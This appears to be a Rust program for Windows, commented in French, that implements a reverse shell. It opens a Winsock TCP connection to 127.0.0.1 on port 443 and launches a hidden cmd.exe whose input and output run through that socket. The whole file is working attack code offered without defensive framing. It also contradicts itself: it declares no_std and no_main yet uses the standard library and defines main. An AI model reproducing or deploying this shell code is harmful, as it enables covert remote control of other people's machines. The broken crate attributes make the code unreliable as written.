// Morceau du code permettant de désactiver la library Standard
#![no_std]   // Pas de Standard Library
#![no_main]  // Pas de point d'entrée "main"


use std::net::Ipv4Addr;
use std::process::exit;
use std::str::FromStr;
use windows::Win32::Foundation::{HANDLE, TRUE};
use windows::Win32::Networking::WinSock::{connect, htons, socket, WSASocketA, WSAStartup, SOCKADDR, SOCKET};
use windows::Win32::System::Threading::{PROCESS_INFORMATION, STARTUPINFOW, CreateProcessA, STARTUPINFOA, CREATE_NEW_CONSOLE, STARTF_USESTDHANDLES, CREATE_NO_WINDOW};
use std::ffi::c_void;
use std::ptr::null_mut;
use windows::core::{Error, PCSTR, PSTR};



fn main() {
    // Spécifier la valeur de la version
    let major: u8 = 2;
    let minor: u8 = 2;

    let version: u16 = ((major as u16) << 8) | (minor as u16);
    println!("version: {}.{}", major, minor);

    // Allouer la structure de WSADATA avec des valeurs par défaut
    use windows::Win32::Networking::WinSock::WSADATA;
    let mut wsa_data: WSADATA = WSADATA::default();

    // Appeler la fonction WSAStartup
    unsafe {
        let result = WSAStartup(version, &mut wsa_data);
        if result != 0 {
            eprintln!(
                "Erreur lors de l'initialisation de Winsock : code{}",
                result
            );
            exit(1);
        } else {
            eprintln!("L'initialisation de Winsock s'est faite sans problème");
        }
    }

    // Importation des constantes nécessaires
    use windows::Win32::Networking::WinSock::SOCKADDR_IN;
    use windows::Win32::Networking::WinSock::{
        ADDRESS_FAMILY, AF_INET, IPPROTO, IPPROTO_TCP, SOCK_STREAM, WINSOCK_SOCKET_TYPE,
    };

    // Définitions des paramètres pour la création du Socket

    let af: ADDRESS_FAMILY = AF_INET; // Famille d'adresses IPv4
    let socket_type: WINSOCK_SOCKET_TYPE = SOCK_STREAM; // Socket orienté connexion TCP
    let protocol: IPPROTO = IPPROTO_TCP; // Protocole TCP

    // Création du Socket

    let socket_handle = unsafe { WSASocketA(af.0.into(), socket_type.0, protocol.0,None,0,0) }
        .expect("Echec de la création du socket");

    let ip: Ipv4Addr = Ipv4Addr::from_str("127.0.0.1").unwrap();

    let sock_address: SOCKADDR_IN = SOCKADDR_IN {
        sin_family: af,
        sin_port: unsafe { htons(443) },
        sin_addr: ip.into(),
        sin_zero: [0; 8],
    };

    let size = std::mem::size_of::<SOCKADDR>();
    let _result2 = unsafe { connect(socket_handle, &sock_address as *const _ as *const _, size as i32) };


    println!("{}",_result2);

    match create_process(socket_handle) {
        Ok(e) => {
            println!("Process created successfully, pid : {}", e.dwProcessId);
        }
        Err(e) => {
            eprintln!("Error creating process: {}", e);
        }
    }
}


fn create_process(socket_handle: SOCKET) -> Result<PROCESS_INFORMATION,Error> {

    let handle = HANDLE(socket_handle.0 as *mut c_void);

    let mut command: Vec<u8> = "C:\\windows\\system32\\cmd.exe\x00".as_bytes().to_vec();

    let startup_info = STARTUPINFOA {
        cb: std::mem::size_of::<STARTUPINFOW>() as u32,
        dwFlags: STARTF_USESTDHANDLES,
        hStdError: handle,
        hStdInput: handle,
        hStdOutput: handle,
        ..Default::default()
    };
    let mut process_info = PROCESS_INFORMATION::default();

    let success = unsafe {
        CreateProcessA(
            PCSTR(null_mut()),
            PSTR(command.as_mut_ptr()) ,
            None,
            None,
            TRUE,
            CREATE_NO_WINDOW,
            None,
            None,
            &startup_info,
            &mut process_info,
        )
    };

    match success {
        Ok(_) => {
            Ok(process_info)
        }
        Err(e) => {
            eprintln!("error process : {}",e);
            return Err(e);
        }
    }

}
